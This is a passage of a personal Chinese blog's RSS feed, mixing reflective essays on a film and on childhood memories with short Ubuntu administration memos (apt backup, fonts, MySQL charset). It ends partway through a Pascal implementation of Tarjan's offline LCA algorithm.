      <category domain="https://i.hsfzxjy.site/categories/Soliloquy/">Soliloquy</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/Random-Thoughts/">Random Thoughts</category>
      
      
      <comments>https://i.hsfzxjy.site/secret/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>那一年，我们望向星空</title>
      <link>https://i.hsfzxjy.site/that-starry-night/</link>
      <guid>https://i.hsfzxjy.site/that-starry-night/</guid>
      <pubDate>Thu, 07 May 2015 16:00:00 GMT</pubDate>
      
        
        
      <description>&lt;blockquote&gt;
&lt;p  class=&quot;noindent&quot;&gt; 还记得吗
那年夏天
最灿烂、最寂寞的星空&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p &gt;其实，比这部电影更出名的，是五月天的那首《星空》，一首我十分熟悉的歌。每当那旋律响起，我总有些淡淡的惆怅：夜空下，尽管繁星璀</description>
        
      
      
      
      <content:encoded><![CDATA[<blockquote><p  class="noindent"> 还记得吗那年夏天最灿烂、最寂寞的星空</p></blockquote><p >其实，比这部电影更出名的，是五月天的那首《星空》，一首我十分熟悉的歌。每当那旋律响起，我总有些淡淡的惆怅：夜空下，尽管繁星璀璨，却无法触及；生活中，尽管万分努力，无奈梦想却悄悄陨落——世上的一切，似乎总要与人作对。然而一曲过后，当那歇斯底里的旋律如晨雾渐渐散去，悔恨、无奈与痛苦，也随之沉淀下来，一切又恢复了平静——就像是伫立于人生的黄昏中，回忆着年少时那数不清的美梦。</p><p >而，直到最近我才得知：这只是一首片尾曲，原来还有一部与它同名的电影。</p><p >《星空》。</p><p >没有浮华的特效，没有肉麻的对白。那一年，一个少年，一位少女，一段耐人寻味的经历。</p><p >“我们一起去看星空吧。”</p><p >那一晚，在城市的光与影中，在混凝土森林间，小美轻轻地问小杰，没有过多的犹豫。</p><p >也许，小美的遭遇是值得同情的：尽管家境殷实，父母却常常争吵不休。每每置身于这偌大的房子里，却都如同处在异域时空，唯有那陈旧的回忆才能给她些许慰藉。相似的经历，让少女认识了小杰——那个在圣诞夜吹笛子的男孩，那个和她一起做教室布置的男孩。</p><p >腾空而起的火车，云雾缭绕的阿里山，雨夜的旧教堂，爷爷的小木屋……一场梦幻般的冒险正在进行着。当然，还有那一夜的星空，灿烂得令人终生难忘。</p><p >可惜，小美却病倒了，旅途也不得不要结束了。</p><p >但生活还得继续。从山里回来，小杰便匆匆地走了，甚至，还没来得及说再见；小美的父母还是离婚了，尽管，小美并不希望。曾经的美好，如松动的拼图般叮当散落下来，露出背后灰色的现实——就像那梦中的场景，残酷，毫不留情。</p><p >只是，那片星空，给了她些许慰藉。</p><p >随着时光流逝，曾经的不解与难舍，终究还是要散去——而留下的，仅有回忆。这，也是歌曲《星空》所要表达的。</p><p >曾几何时，我们每个人心中，都有一片属于自己的星空——在年少时，在我们的上古时代，当我们依旧单纯。</p><p >总有一段幻想，让我们流连忘返，就像驰骋于梵高画卷中的铁皮列车；总有一段冒险，让我们刻骨铭心，正如山林间那次凶险的跋涉；而总有一个人，值得我们用一生去回忆。</p><p >当残酷的现实还未闯入梦境，当尘世的烦扰还没纠缠于心，那时，那个无法无天的自己，才是真正快乐的。</p><p >人，是脆弱的。也许，生活的磨难能使我们变得懦弱，岁月的流逝会让我们失去梦想，世间的一切都和自己过不去。</p><p >但，人也可以很坚强。需要的并不多，只是那一片铭记在心的星空。</p>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Soliloquy/">Soliloquy</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/Random-Thoughts/">Random Thoughts</category>
      
      
      <comments>https://i.hsfzxjy.site/that-starry-night/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>如何备份 apt-get 已安装的软件列表</title>
      <link>https://i.hsfzxjy.site/backup-apt-get/</link>
      <guid>https://i.hsfzxjy.site/backup-apt-get/</guid>
      <pubDate>Sat, 18 Apr 2015 16:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p &gt;&lt;code&gt;apt-get&lt;/code&gt; 是 Ubuntu 下管理软件包的一个工具，实用简单，功能强大。平时若要安装或卸载软件包，只需轻敲一条指令即可。每一台 Ubuntu 上，都安装着数以千百计的软件包——或是内核模块，或是工作、娱乐所需的软件，在它们的支持下，工作着这</description>
        
      
      
      
      <content:encoded><![CDATA[<p ><code>apt-get</code> 是 Ubuntu 下管理软件包的一个工具，实用简单，功能强大。平时若要安装或卸载软件包，只需轻敲一条指令即可。每一台 Ubuntu 上，都安装着数以千百计的软件包——或是内核模块，或是工作、娱乐所需的软件，在它们的支持下，工作着这个开放的操作系统。</p><p >但，如果有一天，系统需要被重装——或是无可救药了，抑或是购置了新的设备，问题来了：</p><blockquote><p  class="noindent"> 如何将现有电脑上的软件包迁移至新的系统呢？</p></blockquote><p  class="par"> 很简单。首先，将原有的软件列表导出：</p><div class="gk-code hljs" data-gk-id="BLOCK1"><div class="gk-code-display"><pre><span class="line">sudo dpkg --get-selections  &gt; app-backup-list.lst</span><br></pre></div></div><p  class="par"> 最好是设置一个定时任务，每隔一段时间就保存一次列表，并且要保存到一个独立的分区。以免某天系统真的坏了。</p><p >接下来便是导入了：</p><div class="gk-code hljs" data-gk-id="BLOCK2"><div class="gk-code-display"><pre><span class="line">sudo dpkg --set-selections &lt; app-backup-list.lst</span><br><span class="line">sudo apt-get -y update</span><br><span class="line">sudo apt-get dselect-upgrade</span><br></pre></div></div><p  class="par"> 至于软件源的备份，只需将 <code>/etc/apt/sources.list</code> 文件复制过去即可。</p>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Memo/">Memo</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/Ubuntu/">Ubuntu</category>
      
      <category domain="https://i.hsfzxjy.site/tags/apt-get/">apt-get</category>
      
      
      <comments>https://i.hsfzxjy.site/backup-apt-get/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>博客迁移至 Github.io</title>
      <link>https://i.hsfzxjy.site/migrate-to-github.io/</link>
      <guid>https://i.hsfzxjy.site/migrate-to-github.io/</guid>
      <pubDate>Thu, 16 Apr 2015 16:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;为什么迁出？&quot;&gt;为什么迁出？&lt;/h2&gt;
&lt;p &gt;话说&lt;strong&gt;SinaAppEngine&lt;/strong&gt;真是越来越不像话了：在没有征得我们开发者的同意的情况下擅自把应用总数限制调整为 5 个（整整少了一半！），还口口声声说是作过调查——&lt;/p&gt;
&lt;bloc</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="为什么迁出？">为什么迁出？</h2><p >话说<strong>SinaAppEngine</strong>真是越来越不像话了：在没有征得我们开发者的同意的情况下擅自把应用总数限制调整为 5 个（整整少了一半！），还口口声声说是作过调查——</p><blockquote><p  class="noindent">“大约 90% 开发者只用 5 个应用就足够了。”</p></blockquote><p  class="nomargin"> 同时，增加配额的钱还那么贵，实在担负不起的我只好精简应用数目，以防未来某天应用数不够用。</p><h2 id="为什么选择-github-pages？">为什么选择 Github Pages？</h2><p >本人爱好程序，习惯以代码的方式来做事——写文章时也不例外。因此，我需要找到一个支持 Markdown 的博客平台进行迁移。为此，我经历了很长时间的思想斗争——</p><p  class="noindent"> <strong>新浪、网易 等国内博客平台？</strong></p><p >果断否决。这些平台都是面向大众的，只提供富文本编辑器，效率捉急。</p><p  class="noindent"> <strong>博客园？“程序员的网上家园”，总会好一些吧？</strong></p><p >虽说最近博客园推出了 Markdown 编辑器，一切似乎很美好。但是——它——没有即时预览的功能！！这么重要的东西都不加上，写作时就像浑水中摸鱼一样，别提多不爽了。再说了，在博客园上聚集的多是些常工作于 Windows 平台下的程序员，在“信仰”方面有些合不来（别打我～～）。思考再三，还是否决了。</p><p >而事实上，比起公共博客平台，我还是比较喜欢个人博客。一来逼格比较高，可以为将来的交友、面试等活动加分；二来可以随心所欲地自定义样式，使网站完全符合我的 Style。</p><p >这么一来，似乎就只剩下 Github Pages 了。</p><h2 id="那么，如何在-github-pages-上进行写作？">那么，如何在 Github Pages 上进行写作？</h2><p >首先要介绍一下 Github Pages 的架构。先看看 <a href="https://help.github.com/articles/using-jekyll-with-pages/#using-jekyll">Github 的介绍</a>：</p><blockquote><h3 id="using-jekyll">Using Jekyll</h3><p >Every GitHub Page is run through Jekyll when you push content to a specially named branch within your repository. For User Pages, use the master branch in your username.github.io repository. For Project Pages, use the gh-pages branch in your project’s repository. Because a normal HTML site is also a valid Jekyll site, you don’t have to do anything special to keep your standard HTML files unchanged. Jekyll has thorough documentation that covers its features and usage. Simply start committing Jekyll formatted files and you’ll be using Jekyll in no time.</p></blockquote><p  class="par"> 可以看得出来，Github Pages 使用 Jekyll 作为后端引擎——这是一个用 Ruby 写的博客框架。但用户不需要写一行 Ruby 的代码，只需在名为 <code>&lt;username&gt;.github.io</code> 的项目下面以一定的目录结构放置 markdown 文件，Jekyll 便会自动生成整个站点。</p><p >这里需要注意的是，Jekyll 生成的站点是<strong>静态的</strong>，也就是说站点的文件是 Jekyll 编译好之后存放在服务器端的，而不是接到请求之后才去编译站点，因此站点的访问速度是相当快的——这也是它的优点。</p><p  class="nomargin"> 我被这种机制深深地震惊了：这是一种我从来没见过的写作方式，无论是从方式上，抑或是从形式上。Jekyll 能让你真正专注于写作，而不是其他一些无谓的东西。</p><p  class="nomargin"> 它把一切无关的东西都摒弃了，这才是真正的极简主义。</p><p >最初的 Jekyll 站点是没有样式的。为了不重复发明轮子，我决定使用现成的主题。在网上略一搜索便有了收获：<a href="http://jekyllbootstrap.com/">Jekyll Bootstrap</a>。</p><p  class="nomargin"> Bootstrap 是我最常用，也是最欣赏的一个前端框架。因此尽管这个主题仍在开发当中，我还是毫不犹豫地选中了它。</p><p  class="nomargin"> 从 <a href="https://github.com/plusjade/jekyll-bootstrap.git">Github</a> 上将这个项目 clone 下来，覆盖到 hsfzxjy.github.io 项目下，理论上，站点就可以运行了。接下来，进行一些样式上的微调就可以了。</p><p >至于评论系统，由于 Github Pages 是静态站点，因此只能使用第三方评论服务。Jekyll 默认的评论服务是 Disqus ——一个国外的评论服务站点，但考虑到我在国内，许多人无法使用 Facebook，Twitter 等社交平台登录评论，我将它替换为了<strong>多说</strong>。具体操作，可以参考 <a href="http://havee.me/internet/2013-07/add-duoshuo-commemt-system-into-jekyll.html">这里</a>。</p><p >Github Pages 上的文章只能在本地编辑，因而需要一个趁手的 Markdown 编辑器。在 Ubuntu 环境下我使用的是 <strong>ReText</strong>：</p><div class="gk-code hljs" data-gk-id="BLOCK1"><div class="gk-code-display"><pre><span class="line">sudo apt-get install retext</span><br></pre></div></div>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Tech/">Tech</category>
      
      
      
      <comments>https://i.hsfzxjy.site/migrate-to-github.io/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Ubuntu 网络每 20 秒断开重连一次的解决方案</title>
      <link>https://i.hsfzxjy.site/solution-of-network-broken-down-per-20s-under-ubuntu/</link>
      <guid>https://i.hsfzxjy.site/solution-of-network-broken-down-per-20s-under-ubuntu/</guid>
      <pubDate>Tue, 31 Mar 2015 03:18:38 GMT</pubDate>
      
        
        
      <description>&lt;p  class=&quot;par&quot;&gt; 从昨天到现在一直都有这个问题，刚刚突然就解决了，至今不明白原理，在此记录一下：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p  class=&quot;noindent&quot;&gt; 在网络设置中取消「需要 IPv6 完成这个链接」的选项&lt;/p&gt;
&lt;/blockquote</description>
        
      
      
      
      <content:encoded><![CDATA[<p  class="par"> 从昨天到现在一直都有这个问题，刚刚突然就解决了，至今不明白原理，在此记录一下：</p><blockquote><p  class="noindent"> 在网络设置中取消「需要 IPv6 完成这个链接」的选项</p></blockquote>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Memo/">Memo</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/Ubuntu/">Ubuntu</category>
      
      
      <comments>https://i.hsfzxjy.site/solution-of-network-broken-down-per-20s-under-ubuntu/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>十年</title>
      <link>https://i.hsfzxjy.site/ten-years/</link>
      <guid>https://i.hsfzxjy.site/ten-years/</guid>
      <pubDate>Tue, 03 Mar 2015 04:19:18 GMT</pubDate>
      
        
        
      <description>&lt;p &gt;再一次站在这里，我却发现早已没有了熟悉的感觉。一切都是那样陌生：长年累月的雨水冲刷，使原本灰色的墙面变得愈加晦暗，有几处墙皮脱落了，酷似一张布满皱纹的老脸；门前，野草肆意地疯长着，没过了缩在墙角的那根水管——记忆中它一直在渗水，却不知何时被修好了，只留下了一圈丑陋的青苔，</description>
        
      
      
      
      <content:encoded><![CDATA[<p >再一次站在这里，我却发现早已没有了熟悉的感觉。一切都是那样陌生：长年累月的雨水冲刷，使原本灰色的墙面变得愈加晦暗，有几处墙皮脱落了，酷似一张布满皱纹的老脸；门前，野草肆意地疯长着，没过了缩在墙角的那根水管——记忆中它一直在渗水，却不知何时被修好了，只留下了一圈丑陋的青苔，像是对这十年光阴的一个标注。</p><p >这里的一切，就像是被人遗弃了。四周站着的那一圈高楼，无时无刻不在表达着对这角隅的不屑——就像长辈们对待无知的孩童一样。而事实上，这里比周围的一切都要年长。</p><p >时光上溯十年，那时，我居住于此。那时，还没有周围这一切。</p><p >曾记得，在不远处的那块菜地，我和小伙伴趟过泥水，猫着腰在捕捉小鱼小虾。柔软的泥土记录这我们的足迹，竹架上的蔬果聆听着我们的欢笑，就连那不知名的虫儿，也哼起歌为我们助兴。</p><p >曾记得，在屋后的那片小树林，上演过一次又一次的“探险之旅”。不畏阴暗，不惧神秘，只求抵达尽头时那种大汗淋漓的快意。</p><p >曾记得，在楼顶的天台，我第一次仰望星空。夏夜的风吹起架子上的藤蔓，吹拂着我的脸庞。和着如水的月光，四周的一切就像仙境般梦幻。</p><p >这里，有着我童年的所有回忆。</p><p >可如今，这一切都像是未曾发生过。这里，也未曾记得。</p><p >十年，很长，长得足以让一个人，去遗忘一个地方。</p><p >再一次遇见他，没有太多的喜悦，只是相视一笑，随即，便陷入了沉默。</p><p >比起上一次相遇，他又有了一些变化，整个人显得更加成熟了。但与此同时，一种未知的像雾一样的却在我们中间弥散开来，凝固着空气，窒息着心灵。</p><p >我竭力搜寻着话题，想要打破这恼人的尴尬，但却徒劳无功——真的没有共同语言了，毕竟在新的环境里，我们都有了新的爱好。</p><p >真是一个让人迷惑的时代——在这里，共有着美好的回忆，却也无法维系十年的友情。</p><p >在那人生的上古时期，他，是我最好的朋友，一起逃过课，在小学边上的山坡尽情地疯玩；一起偷过钱，忐忑地在小商店购买垂涎已久的零食。那些年和他，一玩能玩一天，一聊能聊一宿。我们有过争吵，而更多时候，我们亲如弟兄。</p><p >记忆中的那些画面，每一张笑脸，每一滴眼泪，都是那样真诚。</p><p >只是，曾经的旧知己，最终还是变不到老友。</p><p >十年，很长，长得足以让一个人，去疏远另一个人。</p><p >十年，真的很长。承载着过去的回忆，有欢笑，有泪水——就像是人那短暂一生的缩影。</p><p >人生又能有几个十年？无从得知。</p><p >因此，每一个十年都弥足珍贵；每一个十年，都要用心去珍惜。</p>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Soliloquy/">Soliloquy</category>
      
      
      
      <comments>https://i.hsfzxjy.site/ten-years/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Ubuntu 杀死进程</title>
      <link>https://i.hsfzxjy.site/kill-processes-under-ubuntu/</link>
      <guid>https://i.hsfzxjy.site/kill-processes-under-ubuntu/</guid>
      <pubDate>Mon, 02 Mar 2015 03:17:55 GMT</pubDate>
      
        
        
      <description>&lt;div class=&quot;gk-code hljs&quot; data-gk-id=&quot;BLOCK1&quot;&gt;&lt;div class=&quot;gk-code-display&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;ps -e &lt;span class=&quot;hljs-comment&quot;&gt;#查看进程列表&lt;</description>
        
      
      
      
      <content:encoded><![CDATA[<div class="gk-code hljs" data-gk-id="BLOCK1"><div class="gk-code-display"><pre><span class="line">ps -e <span class="hljs-comment">#查看进程列表</span></span><br><span class="line">sudo <span class="hljs-built_in">kill</span> &lt;pid&gt;</span><br></pre></div></div>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Memo/">Memo</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/Ubuntu/">Ubuntu</category>
      
      
      <comments>https://i.hsfzxjy.site/kill-processes-under-ubuntu/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Ubuntu 安装 Sublime 2</title>
      <link>https://i.hsfzxjy.site/sublime-text-2-installation-under-ubuntu/</link>
      <guid>https://i.hsfzxjy.site/sublime-text-2-installation-under-ubuntu/</guid>
      <pubDate>Mon, 29 Dec 2014 03:31:02 GMT</pubDate>
      
        
        
      <description>&lt;div class=&quot;gk-code hljs&quot; data-gk-id=&quot;BLOCK1&quot;&gt;&lt;div class=&quot;gk-code-display&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;sudo add-apt-repository ppa:webupd8team/s</description>
        
      
      
      
      <content:encoded><![CDATA[<div class="gk-code hljs" data-gk-id="BLOCK1"><div class="gk-code-display"><pre><span class="line">sudo add-apt-repository ppa:webupd8team/sublime-text-2</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install sublime-text-2</span><br></pre></div></div>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Memo/">Memo</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/Ubuntu/">Ubuntu</category>
      
      <category domain="https://i.hsfzxjy.site/tags/Sublime-Text/">Sublime Text</category>
      
      
      <comments>https://i.hsfzxjy.site/sublime-text-2-installation-under-ubuntu/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Ubuntu 加入自己的字体</title>
      <link>https://i.hsfzxjy.site/add-custom-fonts-under-ubuntu/</link>
      <guid>https://i.hsfzxjy.site/add-custom-fonts-under-ubuntu/</guid>
      <pubDate>Fri, 12 Dec 2014 23:50:34 GMT</pubDate>
      
        
        
      <description>&lt;p  class=&quot;par&quot;&gt; 假设字体文件夹为：&lt;code&gt;～/Fonts&lt;/code&gt;。执行：&lt;/p&gt;
&lt;div class=&quot;gk-code hljs&quot; data-gk-id=&quot;BLOCK1&quot;&gt;&lt;div class=&quot;gk-code-display&quot;&gt;&lt;pre&gt;&lt;span</description>
        
      
      
      
      <content:encoded><![CDATA[<p  class="par"> 假设字体文件夹为：<code>～/Fonts</code>。执行：</p><div class="gk-code hljs" data-gk-id="BLOCK1"><div class="gk-code-display"><pre><span class="line">sudo <span class="hljs-built_in">mkdir</span> -p /usr/share/fonts/myFonts</span><br><span class="line">sudo <span class="hljs-built_in">cp</span> ~/Fonts/*.ttf /usr/share/fonts/myFonts/</span><br><span class="line">sudo <span class="hljs-built_in">chmod</span> 644 /usr/share/fonts/myFonts/*.ttf</span><br><span class="line"><span class="hljs-built_in">cd</span> /usr/share/fonts/winFonts/</span><br><span class="line">sudo mkfontscale  <span class="hljs-comment">#创建雅黑字体的fonts.scale文件，它用来控制字体旋转缩放</span></span><br><span class="line">sudo mkfontdir    <span class="hljs-comment">#创建雅黑字体的fonts.dir文件，它用来控制字体粗斜体产生</span></span><br><span class="line">sudo fc-cache -fv <span class="hljs-comment">#建立字体缓存信息，也就是让系统认识雅黑</span></span><br></pre></div></div>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Memo/">Memo</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/Ubuntu/">Ubuntu</category>
      
      <category domain="https://i.hsfzxjy.site/tags/Font/">Font</category>
      
      
      <comments>https://i.hsfzxjy.site/add-custom-fonts-under-ubuntu/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Ubuntu 下删除不完整的包</title>
      <link>https://i.hsfzxjy.site/remove-broken-packages-under-ubuntu/</link>
      <guid>https://i.hsfzxjy.site/remove-broken-packages-under-ubuntu/</guid>
      <pubDate>Fri, 12 Dec 2014 21:41:10 GMT</pubDate>
      
        
        
      <description>&lt;p  class=&quot;par&quot;&gt; 答案来自 &lt;a href=&quot;http://stackoverflow.com/questions/27455626/how-to-remove-an-incomplete-package-by-using-apt-get&quot;&gt;StackOverfl</description>
        
      
      
      
      <content:encoded><![CDATA[<p  class="par"> 答案来自 <a href="http://stackoverflow.com/questions/27455626/how-to-remove-an-incomplete-package-by-using-apt-get">StackOverflow</a>:</p><div class="gk-code hljs" data-gk-id="BLOCK1"><div class="gk-code-display"><pre><span class="line">sudo dpkg --remove --force-remove-reinstreq &lt;your package name&gt;</span><br></pre></div></div>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Memo/">Memo</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/Ubuntu/">Ubuntu</category>
      
      
      <comments>https://i.hsfzxjy.site/remove-broken-packages-under-ubuntu/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Ubuntu 下解决 apt-get“Hash 校验和不符的方案”</title>
      <link>https://i.hsfzxjy.site/solution-of-apt-get-error-hash-checksum-incorrect/</link>
      <guid>https://i.hsfzxjy.site/solution-of-apt-get-error-hash-checksum-incorrect/</guid>
      <pubDate>Sat, 29 Nov 2014 02:26:18 GMT</pubDate>
      
        
        
      <description>&lt;p  class=&quot;noindent&quot;&gt; 各种坑爹，我也不知道为什么：&lt;/p&gt;
&lt;div class=&quot;gk-code hljs&quot; data-gk-id=&quot;BLOCK1&quot;&gt;&lt;div class=&quot;gk-code-display&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;</description>
        
      
      
      
      <content:encoded><![CDATA[<p  class="noindent"> 各种坑爹，我也不知道为什么：</p><div class="gk-code hljs" data-gk-id="BLOCK1"><div class="gk-code-display"><pre><span class="line">    sudo gedit etc/apt/apt.conf.d/00aptitude</span><br></pre></div></div><p  class="par"> 最后加一行：<code>Acquire::CompressionTypes::Order &quot;gz&quot;;</code></p>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Memo/">Memo</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/Ubuntu/">Ubuntu</category>
      
      
      <comments>https://i.hsfzxjy.site/solution-of-apt-get-error-hash-checksum-incorrect/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>在 Ubuntu 下更改 MYSQL 的字符集</title>
      <link>https://i.hsfzxjy.site/alter-mysql-character-set-under-ubuntu/</link>
      <guid>https://i.hsfzxjy.site/alter-mysql-character-set-under-ubuntu/</guid>
      <pubDate>Fri, 28 Nov 2014 05:49:30 GMT</pubDate>
      
        
        
      <description>&lt;p  class=&quot;noindent&quot;&gt; 修改 &lt;code&gt;/etc/mysql/my.cnf&lt;/code&gt;：&lt;/p&gt;
&lt;div class=&quot;gk-code hljs&quot; data-gk-id=&quot;BLOCK1&quot;&gt;&lt;div class=&quot;gk-code-display&quot;&gt;&lt;pre</description>
        
      
      
      
      <content:encoded><![CDATA[<p  class="noindent"> 修改 <code>/etc/mysql/my.cnf</code>：</p><div class="gk-code hljs" data-gk-id="BLOCK1"><div class="gk-code-display"><pre><span class="line"><span class="hljs-section">[client]</span></span><br><span class="line"><span class="hljs-attr">default-character-set</span>=utf8</span><br><span class="line"></span><br><span class="line"><span class="hljs-section">[mysqld]</span></span><br><span class="line"><span class="hljs-attr">character_set_server</span>=utf8</span><br><span class="line"></span><br><span class="line"><span class="hljs-section">[mysql]</span></span><br><span class="line"><span class="hljs-attr">default-character-set</span>=utf8</span><br></pre></div></div><p  class="par"> 然后 <code>sudo service mysql restart</code></p>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Memo/">Memo</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/MySQL/">MySQL</category>
      
      <category domain="https://i.hsfzxjy.site/tags/Ubuntu/">Ubuntu</category>
      
      
      <comments>https://i.hsfzxjy.site/alter-mysql-character-set-under-ubuntu/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>LCA 之离线 Tarjan 算法</title>
      <link>https://i.hsfzxjy.site/lca-Tarjan/</link>
      <guid>https://i.hsfzxjy.site/lca-Tarjan/</guid>
      <pubDate>Sun, 02 Nov 2014 01:05:45 GMT</pubDate>
      
        
        
      <description>&lt;blockquote&gt;
&lt;p  class=&quot;noindent&quot;&gt; 真是巧妙的算法！&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p &gt;比起树上倍增，Tarjan 算法实现起来更为简单，一个 DFS 加并查集即可。缺点便是：&lt;strong&gt;需要先把所有的查询都读进来，并且要储存结果&lt;</description>
        
      
      
      
      <content:encoded><![CDATA[<blockquote><p  class="noindent"> 真是巧妙的算法！</p></blockquote><p >比起树上倍增，Tarjan 算法实现起来更为简单，一个 DFS 加并查集即可。缺点便是：<strong>需要先把所有的查询都读进来，并且要储存结果</strong>。复杂度为 $O(n+q)$。</p><h2 id="code-10">Code</h2><div class="gk-code hljs" data-gk-id="BLOCK1"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">var</span></span><br><span class="line">    sets: <span class="hljs-keyword">array</span> [<span class="hljs-number">1</span>..<span class="hljs-number">100</span>] <span class="hljs-keyword">of</span> longint;</span><br><span class="line">    visited: <span class="hljs-keyword">array</span> [<span class="hljs-number">1</span>..<span class="hljs-number">100</span>] <span class="hljs-keyword">of</span> Boolean;</span><br><span class="line">    a: <span class="hljs-keyword">array</span> [<span class="hljs-number">1</span>..<span class="hljs-number">100</span>, <span class="hljs-number">1</span>..<span class="hljs-number">100</span>] <span class="hljs-keyword">of</span> Boolean;</span><br><span class="line">    questions: <span class="hljs-keyword">array</span> [<span class="hljs-number">1</span>..<span class="hljs-number">1000</span>] <span class="hljs-keyword">of</span> <span class="hljs-keyword">record</span></span><br><span class="line">        x, y: longint;</span><br><span class="line">        ans: longint;</span><br><span class="line">    <span class="hljs-keyword">end</span>;</span><br><span class="line">    qn, n, i, m, x, y, root: longint;</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">find</span><span class="hljs-params">(x: longint)</span>:</span> longint;</span><br><span class="line"><span class="hljs-keyword">begin</span></span><br><span class="line">    <span class="hljs-keyword">if</span> x = sets[x] <span class="hljs-keyword">then</span> <span class="hljs-keyword">exit</span>(x);</span><br><span class="line">    sets[x] := find(sets[x]);</span><br><span class="line">    <span class="hljs-keyword">exit</span>(sets[x]);</span><br><span class="line"><span class="hljs-keyword">end</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">procedure</span> <span class="hljs-title">dfs</span><span class="hljs-params">(x: longint)</span>;</span></span><br><span class="line"><span class="hljs-keyword">var</span></span><br><span class="line">    i: longint;</span><br><span class="line"><span class="hljs-keyword">begin</span></span><br><span class="line">    visited[x] := true;</span><br><span class="line">    <span class="hljs-comment">//对于两个节点都已访问到的询问，其结果已经出来了</span></span><br><span class="line">    <span class="hljs-keyword">for</span> i := <span class="hljs-number">1</span> <span class="hljs-keyword">to</span> qn <span class="hljs-keyword">do</span></span><br><span class="line">    <span class="hljs-keyword">begin</span></span><br><span class="line">        <span class="hljs-keyword">if</span> visited[questions[i].x] <span class="hljs-keyword">and</span> visited[questions[i].y] <span class="hljs-keyword">then</span></span><br><span class="line">            <span class="hljs-keyword">if</span> questions[i].x = x <span class="hljs-keyword">then</span></span><br><span class="line">                questions[i].ans := find(questions[i].y)</span><br><span class="line">            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> questions[i].y = x <span class="hljs-keyword">then</span></span><br><span class="line">                questions[i].ans := find(questions[i].x);</span><br><span class="line">    <span class="hljs-keyword">end</span>;</span><br><span class="line">    <span class="hljs-keyword">for</span> i := <span class="hljs-number">1</span> <span class="hljs-keyword">to</span> n <span class="hljs-keyword">do</span></span><br><span class="line">    <span class="hljs-keyword">begin</span></span><br><span class="line">        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> a[i, x] <span class="hljs-keyword">or</span> visited[i] <span class="hljs-keyword">then</span> <span class="hljs-keyword">continue</span>;</span><br><span class="line">        dfs(i);</span><br><span class="line">        sets[find(i)] := x;</span><br><span class="line">    <span class="hljs-keyword">end</span>;</span><br><span class="line"><span class="hljs-keyword">end</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">begin</span></span><br><span class="line">    assign(input, <span class="hljs-string">&#x27;main.in&#x27;</span>); reset(input);</span><br><span class="line">    assign(output, <span class="hljs-string">&#x27;main.out&#x27;</span>); rewrite(output);</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">read</span>(n, m);</span><br><span class="line">    <span class="hljs-keyword">for</span> i := <span class="hljs-number">1</span> <span class="hljs-keyword">to</span> n <span class="hljs-keyword">do</span></span><br><span class="line">        sets[i] := i;</span><br><span class="line">    <span class="hljs-keyword">for</span> i := <span class="hljs-number">1</span> <span class="hljs-keyword">to</span> m <span class="hljs-keyword">do</span></span><br><span class="line">    <span class="hljs-keyword">begin</span></span><br><span class="line">        <span class="hljs-keyword">read</span>(x, y);</span><br><span class="line">        a[x, y] := true;</span><br><span class="line">        a[y, x] := True;</span><br><span class="line">    <span class="hljs-keyword">end</span>;</span><br><span class="line">    <span class="hljs-keyword">read</span>(root);</span><br><span class="line">    qn := <span class="hljs-number">0</span>;</span><br><span class="line">    <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> eof <span class="hljs-keyword">do</span></span><br><span class="line">    <span class="hljs-keyword">begin</span></span><br><span class="line">        inc(qn);</span><br><span class="line">        <span class="hljs-keyword">read</span>(questions[qn].x, questions[qn].y);</span><br><span class="line">    <span class="hljs-keyword">end</span>;</span><br><span class="line">    dfs(root);</span><br><span class="line">    <span 